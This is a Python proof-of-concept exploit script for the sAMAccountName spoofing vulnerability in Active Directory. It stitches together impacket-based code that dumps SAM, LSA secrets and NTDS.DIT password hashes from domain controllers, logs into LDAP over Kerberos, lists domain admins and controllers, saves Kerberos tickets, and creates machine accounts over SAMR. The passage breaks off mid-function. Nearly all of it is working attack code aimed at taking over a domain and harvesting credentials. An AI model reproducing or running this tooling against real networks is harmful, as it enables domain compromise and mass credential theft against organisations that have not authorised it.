#!/bin/env python3
'''SAMACCOUNTNAME SPOOFING VULNERABILITY POC '''
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
import argparse
import codecs
import logging
import os
import sys
import random
import string
import datetime
import traceback
import json
import struct
from binascii import hexlify, unhexlify
import binascii
from getpass import getpass
import ldap3
import ldapdomaindump
from dns import resolver
from ldap3.utils.conv import escape_filter_chars

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue


from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
from impacket.krb5.keytab import Keytab
from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket import version
from impacket.examples import logger, utils
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.examples.utils import parse_credentials
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, getKerberosTGS
from impacket.dcerpc.v5 import samr, epm, transport
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype
from impacket.krb5.constants import TicketFlags
from impacket.ntlm import compute_nthash
from impacket.winregistry import hexdump

###############################
# => IMPORT SECRETSDUMP.PY
#################################


class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__useVSSMethod = options.use_vss
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = options.system
        self.__bootkey = options.bootkey
        self.__securityHive = options.security
        self.__samHive = options.sam
        self.__ntdsFile = options.ntds
        self.__history = options.history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = options.outputfile
        self.__doKerberos = options.k
        self.__justDC = options.just_dc
        self.__justDCNTLM = options.just_dc_ntlm
        self.__justUser = options.just_dc_user
        self.__pwdLastSet = options.pwd_last_set
        self.__printUserStatus= options.user_status
        self.__resumeFileName = options.resumefile
        self.__canProcessSAMLSA = True
        self.__kdcHost = options.dc_ip
        self.__options = options

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def dump(self):
        try:
            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                self.__isRemote = False
                self.__useVSSMethod = True
                if self.__systemHive:
                    localOperations = LocalOperations(self.__systemHive)
                    bootKey = localOperations.getBootKey()
                    if self.__ntdsFile is not None:
                    # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    bootKey = binascii.unhexlify(self.__bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            print(f'SMBConnection didn\'t work, hoping Kerberos will help ({str(e)})')
                            # pass
                        else:
                            raise

                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                        self.__remoteOps.enableRegistry()
                        bootKey             = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                        and self.__doKerberos is True:
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        print('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
                    else:
                        print(f'RemoteOperations failed: {str(e)}')

            # If RemoteOperations succeeded, then we can extract SAM and LSA
            if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
                try:
                    if self.__isRemote is True:
                        SAMFileName         = self.__remoteOps.saveSAM()
                    else:
                        SAMFileName         = self.__samHive

                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                    self.__SAMHashes.dump()
                    if self.__outputFileName is not None:
                        self.__SAMHashes.export(self.__outputFileName)
                except Exception as e:
                    print(f'SAM hashes extraction failed: {str(e)}')

                try:
                    if self.__isRemote is True:
                        SECURITYFileName = self.__remoteOps.saveSECURITY()
                    else:
                        SECURITYFileName = self.__securityHive

                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                   isRemote=self.__isRemote, history=self.__history)
                    self.__LSASecrets.dumpCachedHashes()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportCached(self.__outputFileName)
                    self.__LSASecrets.dumpSecrets()
                    if self.__outputFileName is not None:
                        self.__LSASecrets.exportSecrets(self.__outputFileName)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        traceback.print_exc()
                    print(f'LSA hashes extraction failed: {str(e)}')

            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
            if self.__isRemote is True:
                if self.__useVSSMethod and self.__remoteOps is not None:
                    NTDSFileName = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName = None
            else:
                NTDSFileName = self.__ntdsFile

            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                           outputFileName=self.__outputFileName, justUser=self.__justUser,
                                           printUserStatus= self.__printUserStatus)
            try:
                self.__NTDSHashes.dump()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    traceback.print_exc()
                if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                    # We don't store the resume file if this error happened, since this error is related to lack
                    # of enough privileges to access DRSUAPI.
                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
                    if resumeFile is not None:
                        os.unlink(resumeFile)
                print(e)
                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
                    print("You just got that error because there might be some duplicates of the same name. "
                                 "Try specifying the domain name for the user as well. It is important to specify it "
                                 "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
                elif self.__useVSSMethod is False:
                    print('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                traceback.print_exc()
            print(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer =  input("Delete resume session file? [y/N] ")
                        if answer.upper() == '':
                            answer = 'N'
                            break
                        elif answer.upper() == 'Y':
                            answer = 'Y'
                            break
                        elif answer.upper() == 'N':
                            answer = 'N'
                            break
                    if answer == 'Y':
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except Exception:
                pass

    def cleanup(self):
        print('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()


# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                      "the remote machine without executing any agent there.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                       ' (if you want to parse local files)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                         'state')
    parser.add_argument('-outputfile', action='store',
                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    parser.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')
    group = parser.add_argument_group('display options')
    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                            'Implies also -just-dc switch')
    group.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                       help='Extract only NTDS.DIT data (NTLM hashes only)')
    group.add_argument('-pwd-last-set', action='store_true', default=False,
                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    group.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            print('-just-dc-user switch is not supported in VSS mode')
            sys.exit(1)
        elif options.resumefile is not None:
            print('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            sys.exit(1)
        elif remoteName.upper() == 'LOCAL' and username == '':
            print('-just-dc-user not compatible in LOCAL mode')
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        print('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
        print('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
        sys.exit(1)

    if remoteName.upper() == 'LOCAL' and username == '':
        if options.system is None and options.bootkey is None:
            print('Either the SYSTEM hive or bootkey is required for local parsing, check help')
            sys.exit(1)
    else:

        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        print(e)


################################
### =>  IMPORT ADDCOMPUTER.PY
#######################################


def get_machine_name(args, domain):
    if args.dc_ip is not None:
        s = SMBConnection(args.dc_ip, args.dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            print(f'Error while anonymous logging into {domain}')
            return
            # raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def parse_identity(args):
    domain, username, password = utils.parse_credentials(args.account)

    if domain == '':
        logging.critical('Domain should be specified!')
        # sys.exit(1)

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        print("No credentials supplied, supply password")
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        hashes = ("aad3b435b51404eeaad3b435b51404ee:".upper() + args.hashes.split(":")[1]).upper()
        lmhash, nthash = hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    return domain, username, password, lmhash, nthash

def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None,
                         TGT=None, TGS=None, useCache=False):

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass



    if TGT is not None or TGS is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            # No cache present
            print(e)
        else:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                print(f'Domain retrieved from CCache: {domain}')

            print(f"Using Kerberos Cache: {os.getenv('KRB5CCNAME')}")
            principal = f'ldap/{target.upper()}@{domain.upper()}'

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = f'krbtgt/{domain.upper()}@{domain.upper()}'
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logging.debug('Using TGT from cache')
                else:
                    logging.debug('No valid credentials found in cache')
            else:
                TGS = creds.toTGS(principal)
                logging.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                print(f'Username retrieved from CCache: {user}')
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                print(f'Username retrieved from CCache: {user}')

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aesKey, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.utcnow()

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True

def init_ldap_connection(target, no_tls, args, domain, username, password, lmhash, nthash):
    user = f'{domain}\\{username}'
    if no_tls:
        use_ssl = False
        port = 389
    else:
        use_ssl = True
        port = 636
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl)
    if args.k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.aesKey, kdcHost=args.dc_ip,useCache=args.no_pass)
    elif args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(args, domain, username, password, lmhash, nthash):
    if args.k:
        target = get_machine_name(args, domain)
    else:
        if args.dc_ip is not None:
            target = args.dc_ip
        else:
            target = domain
    return init_ldap_connection(target, args.use_ldap, args, domain, username, password, lmhash, nthash)



def get_user_info(samname, ldap_session, domain_dumper):
    ldap_session.search(domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname),
            attributes=['objectSid','ms-DS-MachineAccountQuota'])
    try:
        et = ldap_session.entries[0]
        js = et.entry_to_json()
        return json.loads(js)
    except IndexError:
        return False


def host2ip(hostname, nameserver,dns_timeout,dns_tcp):
    dnsresolver = resolver.Resolver()
    if nameserver:
        dnsresolver.nameservers = [nameserver]
    dnsresolver.lifetime = float(dns_timeout)
    try:
        q = dnsresolver.query(hostname, 'A', tcp=dns_tcp)
        for r in q:
            addr = r.address
        return addr
    except Exception as e:
        print(f"Resolved Failed: {e}")
        return None

def get_dc_host(ldap_session, domain_dumper,options):
    dc_host = {}
    ldap_session.search(domain_dumper.root, '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
            attributes=['name','dNSHostName'])
    if len(ldap_session.entries) > 0:
        for host in ldap_session.entries:
            dc_host[str(host['name'])] = {}
            dc_host[str(host['name'])]['dNSHostName'] = str(host['dNSHostName'])
            host_ip = host2ip(str(host['dNSHostName']), options.dc_ip, 3, True)
            if host_ip:
                dc_host[str(host['name'])]['HostIP'] = host_ip
            else:
                dc_host[str(host['name'])]['HostIP'] = ''
    return dc_host



def get_domain_admins(ldap_session, domain_dumper):
    admins = []
    ldap_session.search(domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars("Domain Admins"),
            attributes=['objectSid'])
    a = ldap_session.entries[0]
    js = a.entry_to_json()
    dn = json.loads(js)['dn']
    search_filter = f"(&(objectClass=person)(sAMAccountName=*)(memberOf:1.2.840.113556.1.4.1941:={dn}))"

    ldap_session.search(domain_dumper.root, search_filter, attributes=["sAMAccountName"])
    for u in ldap_session.entries:
        admins.append(str(u['sAMAccountName']))

    return admins

# Del computer if we have rights.
def del_added_computer(ldap_session, domain_dumper, domainComputer):
    print(f"Attempting to del a computer with the name: {domainComputer}")
    success = ldap_session.search(domain_dumper.root, f'(sAMAccountName={escape_filter_chars(domainComputer)})', attributes=['objectSid'])
    if success is False or len(ldap_session.entries) != 1:
        print(f"Host {domainComputer} not found..")
        return
    target = ldap_session.entries[0]
    target_dn = target.entry_dn
    ldap_session.delete(target_dn)
    if ldap_session.result['result'] == 0:
        print(f'Delete computer {domainComputer} successfully!')
    else:
        print('Delete computer {domainComputer} Failed! Maybe the current user does not have permission.')


class GETTGT:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user= target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__options = options
        self.__kdcHost = options.dc_ip
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')
        if options.old_hash:
            self.__password = None
            self.__lmhash, self.__nthash = options.old_pass.split(':')

    def saveTicket(self, ticket, sessionKey):
        print(f"Saving a DC\'s ticket in {(self.__user + '.ccache')}")
        ccache = CCache()

        ccache.fromTGT(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__user + '.ccache')

    def run(self):
        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey,
                                                                self.__kdcHost)
        self.saveTicket(tgt,oldSessionKey)



################################
### =>  IMPORT ADDCOMPUTER.PY
#######################################




class AddComputerSAMR:

    def __init__(self, username, password, domain, cmdLineOptions,computer_name=None,computer_pass=None):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__hashes = cmdLineOptions.hashes
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = cmdLineOptions.dc_host
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__computerName = computer_name
        self.__computerPassword = computer_pass
        self.__method = 'SAMR'
        self.__port = cmdLineOptions.port
        self.__domainNetbios = cmdLineOptions.domain_netbios
        self.__noAdd = False
        self.__delete = False
        self.__targetIp = cmdLineOptions.dc_ip

        if self.__targetIp is not None:
            self.__kdcHost = self.__targetIp


        if self.__doKerberos and cmdLineOptions.dc_host is None:
            raise ValueError("Kerberos auth requires DNS name of the target DC. Use -dc-host.")


        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # if self.__computerName is None:
        #     if self.__noAdd:
        #         raise ValueError("You have to provide a computer name when using -no-add.")
        #     elif self.__delete:
        #         raise ValueError("You have to provide a computer name when using -delete.")
        # else:
        #     if self.__computerName[-1] != '$':
        #         self.__computerName += '$'

        if self.__computerPassword is None:
            self.__computerPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

        if self.__target is None:
            self.__target = self.__domain

        if self.__port is None:
            if self.__method == 'SAMR':
                self.__port = 445
            elif self.__method == 'LDAPS':
                self.__port = 636

        if self.__domainNetbios is None:
            self.__domainNetbios = self.__domain



    def run_samr(self):
        if self.__targetIp is not None:
            stringBinding = epm.hept_map(self.__targetIp, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
        else:
            stringBinding = epm.hept_map(self.__target, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_dport(self.__port)

        if self.__targetIp is not None:
            rpctransport.setRemoteHost(self.__targetIp)
            rpctransport.setRemoteName(self.__target)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)

        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.doSAMRAdd(rpctransport)

    def generateComputerName(self):
        return 'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')

    def doSAMRAdd(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        servHandle = None
        domainHandle = None
        userHandle = None
        try:
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            samrConnectResponse = samr.hSamrConnect5(dce, '\\\\%s\x00' % self.__target,
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )
            servHandle = samrConnectResponse['ServerHandle']

            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)
            domains = samrEnumResponse['Buffer']['Buffer']
            domainsWithoutBuiltin = list(filter(lambda x : x['Name'].lower() != 'builtin', domains))

            if len(domainsWithoutBuiltin) > 1:
                domain = list(filter(lambda x : x['Name'].lower() == self.__domainNetbios, domains))
                if len(domain) != 1:
                    logging.critical("This server provides multiple domains and '%s' isn't one of them.", self.__domainNetbios)
                    logging.critical("Available domain(s):")
                    for domain in domains:
                        print(f" * {domain['Name']}")
                    logging.critical("Consider using -domain-netbios argument to specify which one you meant.")
                    raise Exception()
                else:
                    selectedDomain = domain[0]['Name']
            else:
                selectedDomain = domainsWithoutBuiltin[0]['Name']

            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, servHandle, selectedDomain)
            domainSID = samrLookupDomainResponse['DomainId']

            if logging.getLogger().level == logging.DEBUG:
                print(f"Opening domain {selectedDomain}...")
            samrOpenDomainResponse = samr.hSamrOpenDomain(dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)
            domainHandle = samrOpenDomainResponse['DomainHandle']


            if self.__noAdd or self.__delete:
                try:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000073:
                        print(f"Account {self.__computerName} not found in domain {selectedDomain}!")
                        return
                        # raise Exception("Account %s not found in domain %s!" % (self.__computerName, selectedDomain))
                    else:
                        return
                        # raise

                userRID = checkForUser['RelativeIds']['Element'][0]
                if self.__delete:
                    access = samr.DELETE
                    message = "delete"
                else:
                    access = samr.USER_FORCE_PASSWORD_CHANGE
                    message = "set password for"
                try:
                    openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)
                    userHandle = openUser['UserHandle']
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        print(f"User {self.__username} doesn't have right to {message} {self.__computerName}!")
                        return
                        # raise Exception("User %s doesn't have right to %s %s!" % (self.__username, message, self.__computerName))
                    else:
                        raise
            else:
                if self.__computerName is not None:
                    try:
                        checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        print(f"Account {self.__computerName} already exists!")
                        return
                        # raise Exception(f"Account {self.__computerName} already exists!")
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xc0000073:
                            return
                            # raise
                else:
                    foundUnused = False
                    while not foundUnused:
                        self.__computerName = self.generateComputerName()
                        try:
                            checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xc0000073:
                                foundUnused = True
                            else:
                                return
                                # raise

                try:
                    createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        print(f"User {self.__username} doesn't have right to create a machine account!")
                        return
                        # raise Exception("User %s doesn't have right to create a machine account!" % self.__username)
                    elif e.error_code == 0xc00002e7:
                        print(f"User {self.__username} machine quota exceeded!")
                        return
                        # raise Exception("User %s machine quota exceeded!" % self.__username)
                    else:
                        raise

                userHandle = createUser['UserHandle']

            if self.__delete:
                samr.hSamrDeleteUser(dce, userHandle)
                print(f"Successfully deleted {self.__computerName}.")
                userHandle = None
            else:
                samr.hSamrSetPasswordInternal4New(dce, userHandle, self.__computerPassword)
                if self.__noAdd:
                    print(f"Successfully set password of {self.__computerName} to {self.__computerPassword}.")
                else:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                    userRID = checkForUser['RelativeIds']['Element'][0]
                    openUser = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID)
                    userHandle = openUser['UserHandle']
                    req = samr.SAMPR_USER_INFO_BUFFER()
                    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
